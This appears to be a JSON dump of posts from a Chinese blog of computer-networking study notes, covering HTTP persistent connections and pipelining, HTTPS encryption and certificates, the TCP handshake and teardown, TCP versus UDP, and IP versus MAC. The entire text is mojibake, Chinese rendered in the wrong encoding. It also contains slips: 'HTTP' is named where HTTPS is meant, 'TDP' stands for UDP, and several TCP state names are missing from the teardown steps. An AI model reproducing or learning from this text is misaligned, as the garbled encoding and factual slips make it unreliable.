æå‡ºäº†â»“è¿æ¥çš„é€šä¿¡æ–¹å¼ï¼Œä¹Ÿå«æŒä¹…è¿æ¥ã€‚è¿™ç§æ–¹å¼çš„å¥½å¤„åœ¨äºå‡å°‘äº† TCP è¿æ¥çš„ô°‚å¤å»ºç«‹å’Œæ–­å¼€æ‰€é€ æˆçš„é¢å¤–å¼€é”€ï¼Œå‡è½»äº†æœåŠ¡å™¨ç«¯çš„è´Ÿè½½ã€‚ æŒä¹…è¿æ¥çš„ç‰¹ç‚¹æ˜¯ï¼Œåªè¦ä»»æ„ä¸€ç«¯æ²¡æœ‰æ˜ç¡®æå‡ºæ–­å¼€è¿æ¥ï¼Œåˆ™ä¿æŒ TCP è¿æ¥çŠ¶æ€ã€‚ 2. ç®¡é“ç½‘ç»œä¼ è¾“HTTP/1.1 é‡‡ç”¨äº†â»“è¿æ¥çš„æ–¹å¼ï¼Œè¿™ä½¿å¾—ç®¡é“(pipeline)ç½‘ç»œä¼ è¾“æˆä¸ºäº†å¯èƒ½ã€‚ å³å¯åœ¨åŒä¸€ä¸ª TCP è¿æ¥é‡Œé¢ï¼Œå®¢æˆ·ç«¯å¯ä»¥å‘èµ·å¤šä¸ªè¯·æ±‚ï¼Œåªè¦ç¬¬ä¸€ä¸ªè¯·æ±‚å‘å‡ºå»äº†ï¼Œä¸å¿…ç­‰å…¶å›æ¥ï¼Œå°±å¯ä»¥å‘ç¬¬ äºŒä¸ªè¯·æ±‚å‡ºå»ï¼Œå¯ä»¥å‡å°‘æ•´ä½“çš„å“åº”æ—¶é—´ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œå®¢æˆ·ç«¯éœ€è¦è¯·æ±‚ä¸¤ä¸ªèµ„æºã€‚ä»¥å‰çš„åšæ³•æ˜¯ï¼Œåœ¨åŒä¸€ä¸ªTCPè¿æ¥é‡Œé¢ï¼Œå…ˆå‘é€ A è¯·æ±‚ï¼Œç„¶åç­‰å¾…æœåŠ¡å™¨åš å‡ºå›åº”ï¼Œæ”¶åˆ°åå†å‘å‡º B è¯·æ±‚ã€‚ç®¡é“æœºåˆ¶åˆ™æ˜¯å…è®¸æµè§ˆå™¨åŒæ—¶å‘å‡º A è¯·æ±‚å’Œ B è¯·æ±‚ã€‚ ä½†æ˜¯æœåŠ¡å™¨è¿˜æ˜¯æŒ‰ç…§é¡ºåºï¼Œå…ˆå›åº” A è¯·æ±‚ï¼Œå®Œæˆåå†å›åº” B è¯·æ±‚ã€‚è¦æ˜¯å‰é¢çš„å›åº”ç‰¹åˆ«æ…¢ï¼Œåé¢å°±ä¼šæœ‰è®¸å¤šè¯·æ±‚ æ’é˜Ÿç­‰ç€ã€‚è¿™ç§°ä¸ºã€Œé˜Ÿå¤´å µå¡ã€ã€‚ 3. å¯¹å¤´é˜»å¡ã€Œè¯·æ±‚ - åº”ç­”ã€çš„æ¨¡å¼åŠ å‰§äº† HTTP çš„æ€§èƒ½é—®é¢˜ã€‚ å› ä¸ºå½“é¡ºåºå‘é€çš„è¯·æ±‚åºåˆ—ä¸­çš„ä¸€ä¸ªè¯·æ±‚å› ä¸ºæŸç§åŸå› è¢«é˜»å¡æ—¶ï¼Œåœ¨åé¢æ’é˜Ÿçš„æ‰€æœ‰è¯·æ±‚ä¹Ÿä¸€åŒè¢«é˜»å¡äº†ï¼Œä¼šå¯¼è‡´å®¢æˆ·ç«¯ä¸€ç›´è¯·æ±‚ä¸åˆ°æ•°æ®ï¼Œè¿™ä¹Ÿå°±æ˜¯ã€Œé˜Ÿå¤´é˜»å¡ã€ã€‚å¥½æ¯”ä¸Šç­çš„è·¯ä¸Šå¡â»‹ã€‚ HTTP ä¸ HTTPSHTTP ä¸ HTTPS çš„åŒºåˆ« HTTP æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œä¿¡æ¯æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œå­˜åœ¨å®‰å…¨é£é™©çš„é—®é¢˜ã€‚HTTPS åˆ™è§£å†³äº† HTTP ä¸å®‰å…¨çš„ç¼ºé™·ï¼Œåœ¨ TCP å’Œ HTTP ç½‘ç»œå±‚ä¹‹é—´åŠ å…¥äº† SSL/TLS å®‰å…¨åè®®ï¼Œä½¿å¾—æŠ¥æ–‡èƒ½å¤ŸåŠ å¯†ä¼ è¾“ã€‚ HTTP è¿æ¥å»ºç«‹ç›¸å¯¹ç®€å•ï¼Œ TCP ä¸‰æ¬¡æ¡æ‰‹ä¹‹åä¾¿å¯ä»¥è¿›è¡Œ HTTP çš„æŠ¥æ–‡ä¼ è¾“ã€‚è€Œ HTTPS åœ¨ TCP ä¸‰æ¬¡æ¡æ‰‹ä¹‹åï¼Œè¿˜éœ€è¦å»ºç«‹ SSL/TLS çš„æ¡æ‰‹è¿‡ç¨‹ï¼Œæ‰èƒ½è¿›è¡ŒåŠ å¯†æŠ¥æ–‡ä¼ è¾“ã€‚ HTTP çš„ç«¯å£å·æ˜¯ 80ï¼ŒHTTPS çš„ç«¯å£å·æ˜¯ 443ã€‚ HTTPS åè®®éœ€è¦å‘ CA(è¯ä¹¦æƒå¨æœºæ„)ç”³è¯·æ•°å­—è¯ä¹¦ï¼Œæ¥ä¿è¯æœåŠ¡å™¨çš„èº«ä»½æ˜¯å¯ä¿¡çš„ã€‚ HTTPS è§£å†³äº†å“ªäº›é—®é¢˜HTTPS åœ¨ HTTP ä¸ TCP å±‚ä¹‹é—´åŠ å…¥äº† SSL/TLS åè®®ï¼Œå¯ä»¥å¾ˆå¥½çš„è§£å†³äº†ä¸Šè¿°çš„â»›é™©: ä¿¡æ¯åŠ å¯†ï¼šé€šä¿¡å†…å®¹è¿›è¡ŒåŠ å¯†ã€‚æ··åˆåŠ å¯†çš„æ–¹å¼å®ç°ä¿¡æ¯çš„åŠ å¯†ä¼ è¾“ï¼Œè§£å†³äº†çªƒå¬çš„é£é™© æ ¡éªŒæœºåˆ¶ï¼šæ— æ³•ç¯¡æ”¹é€šä¿¡å†…å®¹ã€‚æ‘˜è¦ç®—æ³•çš„æ–¹å¼æ¥å®ç°å®Œæ•´æ€§ï¼Œå®ƒèƒ½å¤Ÿä¸ºæ•°æ®ç”Ÿæˆç‹¬ä¸€æ— äºŒçš„ã€ŒæŒ‡çº¹ã€ï¼ŒæŒ‡çº¹ç”¨äºæ ¡éªŒæ•°æ®çš„å®Œæ•´æ€§ï¼Œè§£å†³äº† ç¯¡æ”¹çš„â»›é™©ã€‚ èº«ä»½è¯ä¹¦ï¼šå°†æœåŠ¡å™¨å…¬é’¥æ”¾å…¥åˆ°æ•°å­—è¯ä¹¦ä¸­ï¼Œè§£å†³äº†å†’å……çš„â»›é™©ã€‚ 1. æ··åˆåŠ å¯† æ··åˆåŠ å¯†çš„æ–¹å¼å®ç°ä¿¡æ¯çš„åŠ å¯†ä¼ è¾“ï¼Œè§£å†³äº†çªƒå¬çš„é£é™©ã€‚ HTTP é‡‡ç”¨çš„æ˜¯å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†ç»“åˆçš„ã€æ··åˆåŠ å¯†ã€æ–¹å¼ï¼š åœ¨é€šä¿¡å»ºç«‹å‰ï¼Œé‡‡ç”¨éå¯¹ç§°åŠ å¯†çš„æ–¹å¼äº¤æ¢ã€ä¼šè¯å¯†é’¥ã€ï¼Œåç»­é€šä¿¡å°±ä¸ä½¿ç”¨éå¯¹ç§°åŠ å¯†äº† åœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œå…¨éƒ¨ä½¿ç”¨å¯¹ç§°åŠ å¯†çš„ã€ä¼šè¯å¯†é’¥ã€çš„æ–¹å¼åŠ å¯†æ˜æ–‡æ•°æ®ã€‚ ä¹‹æ‰€ä»¥è¿™ä¹ˆåšçš„åŸå› æ˜¯å› ä¸ºï¼š å¯¹ç§°åŠ å¯†åªä½¿ç”¨ä¸€ä¸ªå¯†é’¥ï¼Œè¿ç®—é€Ÿåº¦å¿«ï¼Œå¯†é’¥å¿…é¡»ä¿å¯†ï¼Œæ— æ³•åšåˆ°å®‰å…¨çš„å¯†é’¥äº¤æ¢ã€‚ éå¯¹ç§°åŠ å¯†ä½¿ç”¨ä¸¤ä¸ªå¯†é’¥ï¼šå…¬é’¥å’Œç§é’¥ï¼Œå…¬é’¥å¯ä»¥ä»»æ„åˆ†å‘è€Œç§é’¥ä¿å¯†ï¼Œè§£å†³äº†å¯†é’¥äº¤æ¢é—®é¢˜ä½†é€Ÿåº¦æ…¢ã€‚ 2. æ‘˜è¦ç®—æ³•æ‘˜è¦ç®—æ³•ç”¨æ¥å®ç°å®Œæ•´æ€§ï¼Œèƒ½å¤Ÿä¸ºæ•°æ®ç”Ÿæˆç‹¬ä¸€æ— äºŒçš„ã€ŒæŒ‡çº¹ã€ï¼Œç”¨äºæ ¡éªŒæ•°æ®çš„å®Œæ•´æ€§ï¼Œè§£å†³äº†ç¯¡æ”¹çš„â»›é™©ã€‚ å®¢æˆ·ç«¯åœ¨å‘é€æ˜æ–‡ä¹‹å‰ä¼šé€šè¿‡æ‘˜è¦ç®—æ³•ç®—å‡ºæ˜æ–‡çš„ã€ŒæŒ‡çº¹ã€ï¼Œå‘é€çš„æ—¶å€™æŠŠã€ŒæŒ‡çº¹ + æ˜æ–‡ã€ä¸€åŒåŠ å¯†æˆå¯†æ–‡åï¼Œå‘ é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è§£å¯†åï¼Œç”¨ç›¸åŒçš„æ‘˜è¦ç®—æ³•ç®—å‡ºå‘é€è¿‡æ¥çš„æ˜æ–‡ï¼Œé€šè¿‡æ¯”è¾ƒå®¢æˆ·ç«¯æºå¸¦çš„ã€ŒæŒ‡çº¹ã€å’Œå½“å‰ç®—å‡º çš„ã€ŒæŒ‡çº¹ã€åšæ¯”è¾ƒï¼Œè‹¥ã€ŒæŒ‡çº¹ã€ç›¸åŒï¼Œè¯´æ˜æ•°æ®æ˜¯å®Œæ•´çš„ã€‚ 3. æ•°å­—è¯ä¹¦å®¢æˆ·ç«¯å…ˆå‘æœåŠ¡å™¨ç«¯ç´¢è¦å…¬é’¥ï¼Œç„¶åç”¨å…¬é’¥åŠ å¯†ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°å¯†æ–‡åï¼Œç”¨è‡ªå·±çš„ç§é’¥è§£å¯†ã€‚ è¿™å°±å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå¦‚ä½•ä¿è¯å…¬é’¥ä¸è¢«ç¯¡æ”¹å’Œä¿¡ä»»åº¦? æ‰€ä»¥è¿™é‡Œå°±éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹æƒå¨æœºæ„ CA (æ•°å­—è¯ä¹¦è®¤è¯æœºæ„)ï¼Œå°†æœåŠ¡å™¨å…¬é’¥æ”¾åœ¨æ•°å­—è¯ä¹¦(ç”±æ•°å­—è¯ä¹¦è®¤è¯ æœºæ„é¢å‘)ä¸­ï¼Œåªè¦è¯ä¹¦æ˜¯å¯ä¿¡çš„ï¼Œå…¬é’¥å°±æ˜¯å¯ä¿¡çš„ã€‚ é€šè¿‡æ•°å­—è¯ä¹¦çš„æ–¹å¼ä¿è¯æœåŠ¡å™¨å…¬é’¥çš„èº«ä»½ï¼Œè§£å†³å†’å……çš„â»›é™©ã€‚","categories":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”03 TCP åè®®ç¯‡","slug":"computer-network-learning-03-tcp-protocol","date":"2022-11-21T04:25:18.000Z","updated":"2023-02-18T03:28:33.575Z","comments":true,"path":"computer-network-learning-03-tcp-protocol/","link":"","permalink":"https://www.0x2beace.com/computer-network-learning-03-tcp-protocol/","excerpt":"ä»€ä¹ˆæ˜¯ TCPï¼Ÿ","text":"ä»€ä¹ˆæ˜¯ TCPï¼Ÿ TCP æ˜¯é¢å‘è¿æ¥çš„ã€å¯é çš„ã€åŸºäºå­—èŠ‚æµçš„ä¼ è¾“å±‚é€šä¿¡åè®®ã€‚ é¢å‘è¿æ¥ï¼šä¸€å®šæ˜¯ã€ä¸€å¯¹ä¸€ã€æ‰èƒ½è¿æ¥ï¼Œä¸èƒ½åƒ UDP åè®®å¯ä»¥ä¸€ä¸ªä¸»æœºåŒæ—¶å‘å¤šä¸ªä¸»æœºå‘é€æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯ä¸€å¯¹å¤šæ— æ³•åšåˆ°ã€‚ å¯é çš„ï¼šæ— è®ºç½‘ç»œé“¾è·¯ä¸­å‡ºç°äº†æ€æ ·çš„é“¾è·¯å˜åŒ–ï¼ŒTCP éƒ½å¯ä»¥ä¿è¯ä¸€ä¸ªæŠ¥æ–‡ä¸€å®šèƒ½å¤Ÿåˆ°è¾¾æ¥æ”¶ç«¯ã€‚ å­—èŠ‚æµï¼šæ¶ˆæ¯æ˜¯ã€æ²¡æœ‰è¾¹ç•Œã€çš„ï¼Œæ‰€ä»¥æ— è®ºæˆ‘ä»¬æ¶ˆæ¯æœ‰å¤šå¤§éƒ½å¯ä»¥è¿›è¡Œä¼ è¾“ã€‚å¹¶ä¸”æ¶ˆæ¯æ˜¯ã€æœ‰åºçš„ã€ï¼Œå½“ã€å‰ä¸€ä¸ªã€æ¶ˆæ¯æ²¡æœ‰æ”¶åˆ°çš„æ—¶å€™ï¼Œå³ä½¿å®ƒå…ˆæ”¶åˆ°äº†åé¢çš„å­—èŠ‚ï¼Œé‚£ä¹ˆä¹Ÿä¸èƒ½æ‰”ç»™åº”ç”¨å±‚å»å¤„ç†ï¼ŒåŒæ—¶å¯¹ã€é‡å¤ã€çš„æŠ¥æ–‡ä¼šè‡ªåŠ¨ä¸¢å¼ƒã€‚ ç®€è¿°ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼š ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼Œå®¢æˆ·ç«¯ç»™æœåŠ¡å‘é€ä¸€ä¸ª syn åŒ…ï¼Œç­‰å¾…æœåŠ¡ç«¯ç¡®è®¤ ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼Œå½“æœåŠ¡ç«¯å—åˆ°è¯·æ±‚ä¹‹åï¼Œæ­¤æ—¶è¦ç»™å®¢æˆ·ç«¯ä¸€ä¸ªç¡®è®¤ä¿¡æ¯ ackï¼Œå¹¶åŒæ—¶å‘é€ syn åŒ…ï¼Œç­‰å¾…å®¢æˆ·ç«¯ç¡®è®¤ ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œå®¢æˆ·ç«¯å—åˆ°æœåŠ¡ç«¯å‘é€çš„ ack + syn åŒ…ä¹‹åï¼Œå‘æœåŠ¡ç«¯å‘é€ ack ä¸ºä»€ä¹ˆ TCP æ¡æ‰‹æ˜¯ä¸‰æ¬¡ï¼Œä¸æ˜¯ä¸¤æ¬¡æˆ–è€…å››æ¬¡ï¼Ÿ å› ä¸ºä¸‰æ¬¡æ¡æ‰‹æ‰èƒ½ä¿è¯åŒæ–¹å…·æœ‰æ¥æ”¶å’Œå‘é€çš„èƒ½åŠ›ã€‚è¿™ä¸ªå›ç­”æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æ¯”è¾ƒç‰‡é¢ï¼Œæ²¡æœ‰è¯´å‡ºä¸»è¦åŸå› ã€‚ ä¸ä½¿ç”¨ã€Œä¸¤æ¬¡æ¡æ‰‹ã€å’Œã€Œå››æ¬¡æ¡æ‰‹ã€çš„åŸå› : ã€Œä¸¤æ¬¡æ¡æ‰‹ã€ï¼šæ— æ³•é˜²æ­¢å†å²è¿æ¥çš„å»ºç«‹ï¼Œä¼šé€ æˆåŒæ–¹èµ„æºçš„æµªè´¹ï¼Œä¹Ÿæ— æ³•å¯é çš„åŒæ­¥åŒæ–¹åºåˆ—å·; ã€Œå››æ¬¡æ¡æ‰‹ã€ï¼šä¸‰æ¬¡æ¡æ‰‹å°±å·²ç»ç†è®ºä¸Šæœ€å°‘å¯é è¿æ¥å»ºç«‹ï¼Œæ‰€ä»¥ä¸éœ€è¦ä½¿ç”¨æ›´å¤šçš„é€šä¿¡æ¬¡æ•°ã€‚ å››æ¬¡æŒ¥æ‰‹è¿‡ç¨‹ï¼š å®¢æˆ·ç«¯æ‰“ç®—å…³é—­è¿æ¥ï¼Œæ­¤æ—¶ä¼šå‘é€ä¸€ä¸ª TCP é¦–éƒ¨ FIN æ ‡å¿—ä½è¢«ç½®ä¸º 1 çš„æŠ¥æ–‡ï¼Œä¹Ÿå³ FIN æŠ¥æ–‡ï¼Œä¹‹åå®¢æˆ· ç«¯è¿›å…¥ FIN_WAIT_1 çŠ¶æ€ã€‚ æœåŠ¡ç«¯æ”¶åˆ°è¯¥æŠ¥æ–‡åï¼Œå°±å‘å®¢æˆ·ç«¯å‘é€ ACK åº”ç­”æŠ¥æ–‡ï¼Œæ¥ç€æœåŠ¡ç«¯è¿›å…¥ CLOSED_WAIT çŠ¶æ€ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯çš„ ACK åº”ç­”æŠ¥æ–‡åï¼Œä¹‹åè¿›å…¥ FIN_WAIT_2 çŠ¶æ€ã€‚ ç­‰å¾…æœåŠ¡ç«¯å¤„ç†å®Œæ•°æ®åï¼Œä¹Ÿå‘å®¢æˆ·ç«¯å‘é€ FIN æŠ¥æ–‡ï¼Œä¹‹åæœåŠ¡ç«¯è¿›å…¥çŠ¶æ€ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯çš„ FIN æŠ¥æ–‡åï¼Œå›ä¸€ä¸ª ACK åº”ç­”æŠ¥æ–‡ï¼Œä¹‹åè¿›å…¥ çŠ¶æ€ æœåŠ¡å™¨æ”¶åˆ°äº† ACK åº”ç­”æŠ¥æ–‡åï¼Œå°±è¿›å…¥äº†çŠ¶æ€ï¼Œè‡³æ­¤æœåŠ¡ç«¯å·²ç»å®Œæˆè¿æ¥çš„å…³é—­ã€‚ å®¢æˆ·ç«¯åœ¨ç»è¿‡ 2MSL ä¸€æ®µæ—¶é—´åï¼Œè‡ªåŠ¨è¿›å…¥ çŠ¶æ€ï¼Œè‡³æ­¤å®¢æˆ·ç«¯ä¹Ÿå®Œæˆè¿æ¥çš„å…³é—­ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸ªæ–¹å‘éƒ½éœ€è¦ä¸€ä¸ª FIN å’Œä¸€ä¸ª ACKï¼Œå› æ­¤é€šå¸¸è¢«ç§°ä¸ºå››æ¬¡æŒ¥æ‰‹ã€‚ ä¸ºä»€ä¹ˆè¦å››æ¬¡æŒ¥æ‰‹ï¼Ÿ ä¸¤æ¬¡æ¡æ‰‹å°±å¯ä»¥é‡Šæ”¾ä¸€ç«¯åˆ°å¦ä¸€ç«¯çš„ TCP è¿æ¥ï¼Œè€Œå®Œå…¨é‡Šæ”¾è¿æ¥åˆ™ä¸€å…±éœ€è¦å››æ¬¡æ¡æ‰‹ã€‚ TCP å’Œ TDP åŒºåˆ«ï¼š1. è¿æ¥ TCP æ˜¯é¢å‘è¿æ¥çš„ä¼ è¾“å±‚åè®®ï¼Œä¼ è¾“æ•°æ®å‰å…ˆè¦å»ºç«‹è¿æ¥ã€‚ UDP åˆ™ä¸éœ€è¦å»ºç«‹è¿æ¥ï¼Œå³åˆ»ä¼ è¾“æ•°æ®ã€‚ 2. æœåŠ¡å¯¹è±¡ TCP æ˜¯ä¸€å¯¹ä¸€çš„ä¸¤ç‚¹æœåŠ¡ï¼Œå³ä¸€ç‚¹è¿æ¥åªæœ‰ä¸¤ä¸ªç«¯ç‚¹ UDP æ”¯æŒä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡ 3. å¯é æ€§ TCP æ˜¯å¯é äº¤ä»˜æ•°æ®çš„ï¼Œæ•°æ®å¯ä»¥æ— å·®é”™ã€ä¸ä¸¢å¤±ã€ä¸é‡å¤ã€æŒ‰éœ€åˆ°è¾¾ UDP æ˜¯å°½æœ€å¤§åŠªåŠ›äº¤ä»˜ï¼Œä¸ä¿è¯å¯é äº¤ä»˜æ•°æ® 4. æ‹¥å¡æ§åˆ¶ã€æµé‡æ§åˆ¶ TCP æœ‰æ‹¥å¡æ§åˆ¶å’Œæµé‡æ§åˆ¶æœºåˆ¶ï¼Œä¿è¯æ•°æ®ä¼ è¾“çš„å®‰å…¨æ€§ UDP åˆ™æ²¡æœ‰ï¼Œå³ä½¿ç½‘ç»œéå¸¸æ‹¥å µäº†ï¼Œä¹Ÿä¸ä¼šå½±å“ UDP çš„å‘é€é€Ÿç‡ 5. é¦–éƒ¨å¼€é”€ TCP é¦–éƒ¨â»“åº¦è¾ƒâ»“ï¼Œä¼šæœ‰ä¸€å®šçš„å¼€é”€ï¼Œé¦–éƒ¨åœ¨æ²¡æœ‰ä½¿ç”¨ã€Œé€‰é¡¹ã€å­—æ®µæ—¶æ˜¯ 20 ä¸ªå­—èŠ‚ï¼Œå¦‚æœä½¿ç”¨äº†ã€Œé€‰é¡¹ã€ å­—æ®µåˆ™ä¼šå˜â»“çš„ã€‚ UDP é¦–éƒ¨åªæœ‰ 8 ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”æ˜¯å›ºå®šä¸å˜çš„ï¼Œå¼€é”€è¾ƒå°ã€‚ 6. ä¼ è¾“æ–¹å¼ TCP æ˜¯æµå¼ä¼ è¾“ï¼Œæ²¡æœ‰è¾¹ç•Œï¼Œä½†ä¿è¯é¡ºåºå’Œå¯é ã€‚ UDP æ˜¯ä¸€ä¸ªåŒ…ä¸€ä¸ªåŒ…çš„å‘é€ï¼Œæ˜¯æœ‰è¾¹ç•Œçš„ï¼Œä½†å¯èƒ½ä¼šä¸¢åŒ…å’Œä¹±åºã€‚ 7. åˆ†ç‰‡ä¸åŒ TCP çš„æ•°æ®å¤§å°å¦‚æœå¤§äº MSS å¤§å°ï¼Œåˆ™ä¼šåœ¨ä¼ è¾“å±‚è¿›è¡Œåˆ†ç‰‡ï¼Œç›®æ ‡ä¸»æœºæ”¶åˆ°åï¼Œä¹ŸåŒæ ·åœ¨ä¼ è¾“å±‚ç»„è£… TCP æ•°æ®åŒ…ï¼Œå¦‚æœä¸­é€”ä¸¢å¤±äº†ä¸€ä¸ªåˆ†ç‰‡ï¼Œåªéœ€è¦ä¼ è¾“ä¸¢å¤±çš„è¿™ä¸ªåˆ†ç‰‡ã€‚ UDP çš„æ•°æ®å¤§å°å¦‚æœå¤§äº MTU å¤§å°ï¼Œåˆ™ä¼šåœ¨ IP å±‚è¿›è¡Œåˆ†ç‰‡ï¼Œç›®æ ‡ä¸»æœºæ”¶åˆ°åï¼Œåœ¨ IP å±‚ç»„è£…å®Œæ•°æ®ï¼Œæ¥ç€å† ä¼ ç»™ä¼ è¾“å±‚ï¼Œä½†æ˜¯å¦‚æœä¸­é€”ä¸¢äº†ä¸€ä¸ªåˆ†ç‰‡ï¼Œåœ¨å®ç°å¯é ä¼ è¾“çš„ UDP æ—¶åˆ™å°±éœ€è¦ô°‚ä¼ æ‰€æœ‰çš„æ•°æ®åŒ…ï¼Œè¿™æ ·ä¼ è¾“ æ•ˆç‡éå¸¸å·®ï¼Œæ‰€ä»¥é€šå¸¸ UDP çš„æŠ¥æ–‡åº”è¯¥å°äº MTUã€‚","categories":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”02 IP ç¯‡","slug":"computer-network-learning-02-ip","date":"2022-11-19T04:25:18.000Z","updated":"2023-02-18T03:28:33.574Z","comments":true,"path":"computer-network-learning-02-ip/","link":"","permalink":"https://www.0x2beace.com/computer-network-learning-02-ip/","excerpt":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”02 IP ç¯‡","text":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”02 IP ç¯‡ IP åŸºæœ¬è®¤è¯†IP åœ¨ TCP/IP å‚è€ƒæ¨¡å‹ä¸­å¤„äºç¬¬ä¸‰å±‚ï¼Œä¹Ÿå°±æ˜¯ç½‘ç»œå±‚ã€‚ ç½‘ç»œå±‚çš„ä¸»è¦ä½œç”¨æ˜¯ï¼šå®ç°ä¸»æœºä¸ä¸»æœºä¹‹é—´çš„é€šä¿¡ï¼Œä¹Ÿå«ç‚¹å¯¹ç‚¹ï¼ˆend to endï¼‰é€šä¿¡ã€‚ IP çš„ä½œç”¨æ˜¯åœ¨å¤æ‚çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œå°†æ•°æ®åŒ…å‘é€ç»™æœ€ç»ˆç›®çš„ä¸»æœºã€‚ IP ä¸ MAC çš„ä½œç”¨IP çš„ä½œç”¨æ˜¯ä¸»æœºä¹‹é—´è¿›è¡Œé€šä¿¡çš„ï¼Œè€Œ MAC çš„ä½œç”¨æ˜¯å®ç°ã€ç›´è¿ã€çš„ä¸¤ä¸ªè®¾å¤‡ä¹‹é—´é€šä¿¡ï¼Œè€Œ IP åˆ™è´Ÿè´£åœ¨ã€Œæ²¡æœ‰ç›´è¿ã€çš„ä¸¤ä¸ªç½‘ç»œä¹‹é—´è¿›è¡Œé€šä¿¡ä¼ è¾“ã€‚ ä¸¾ä¸ªæ —å­ã€‚ å°æ—è¦å»ä¸€ä¸ªå¾ˆè¿œçš„åœ°æ–¹æ—…è¡Œï¼Œåˆ¶å®šäº†ä¸€ä¸ªè¡Œç¨‹è¡¨ï¼Œå…¶é—´éœ€å…ˆåä¹˜åâ»œæœºã€åœ°é“ã€å…¬äº¤â»‹æ‰èƒ½æŠµè¾¾ç›®çš„åœ°ï¼Œä¸ºæ­¤å°æ—éœ€è¦ä¹°â»œæœºç¥¨ï¼Œåœ°é“ç¥¨ç­‰ã€‚ â»œæœºç¥¨å’Œåœ°é“ç¥¨éƒ½æ˜¯å»å¾€ç‰¹å®šçš„åœ°ç‚¹çš„ï¼Œæ¯å¼ ç¥¨åªèƒ½å¤Ÿåœ¨æŸä¸€é™å®šåŒºé—´å†…ç§»åŠ¨ï¼Œæ­¤å¤„çš„ã€ŒåŒºé—´å†…ã€å°±å¦‚åŒé€šä¿¡ç½‘ç»œä¸­æ•°æ®é“¾è·¯ã€‚ åœ¨åŒºé—´å†…ç§»åŠ¨ç›¸å½“äºæ•°æ®é“¾è·¯å±‚ï¼Œå……å½“åŒºé—´å†…ä¸¤ä¸ªèŠ‚ç‚¹ä¼ è¾“çš„åŠŸèƒ½ï¼ŒåŒºé—´å†…çš„å‡ºå‘ç‚¹å¥½æ¯”æº MAC åœ°å€ï¼Œç›®æ ‡åœ°ç‚¹ å¥½æ¯”ç›®çš„ MAC åœ°å€ã€‚ æ•´ä¸ªæ—…æ¸¸è¡Œç¨‹è¡¨å°±ç›¸å½“äºç½‘ç»œå±‚ï¼Œå……å½“è¿œç¨‹å®šä½çš„åŠŸèƒ½ï¼Œè¡Œç¨‹çš„å¼€å§‹å¥½æ¯”æº IPï¼Œè¡Œç¨‹çš„ç»ˆç‚¹å¥½æ¯”ç›®çš„ IP åœ°å€ã€‚ å¦‚æœå°æ—åªæœ‰è¡Œç¨‹è¡¨è€Œæ²¡æœ‰â»‹ç¥¨ï¼Œå°±æ— æ³•æ­ä¹˜äº¤é€šå·¥å…·åˆ°è¾¾ç›®çš„åœ°ã€‚ç›¸åï¼Œå¦‚æœé™¤äº†â»‹ç¥¨è€Œæ²¡æœ‰è¡Œç¨‹è¡¨ï¼Œææ€•ä¹Ÿå¾ˆéš¾åˆ°è¾¾ç›®çš„åœ°ã€‚å› ä¸ºå°æ—ä¸çŸ¥é“è¯¥åä»€ä¹ˆâ»‹ï¼Œä¹Ÿä¸çŸ¥é“è¯¥åœ¨å“ªé‡Œæ¢ä¹˜ã€‚ å› æ­¤ï¼Œåªæœ‰ä¸¤è€…å…¼å¤‡ï¼Œæ—¢æœ‰æŸä¸ªåŒºé—´çš„â»‹ç¥¨åˆæœ‰æ•´ä¸ªæ—…è¡Œçš„è¡Œç¨‹è¡¨ï¼Œæ‰èƒ½ä¿è¯åˆ°è¾¾ç›®çš„åœ°ã€‚ä¸æ­¤ç±»ä¼¼ï¼Œè®¡ç®—æœºç½‘ç»œ ä¸­ä¹Ÿéœ€è¦ã€Œæ•°æ®é“¾è·¯å±‚ã€å’Œã€Œç½‘ç»œå±‚ã€è¿™ä¸ªåˆ†å±‚æ‰èƒ½å®ç°å‘æœ€ç»ˆç›®æ ‡åœ°å€çš„é€šä¿¡ã€‚ 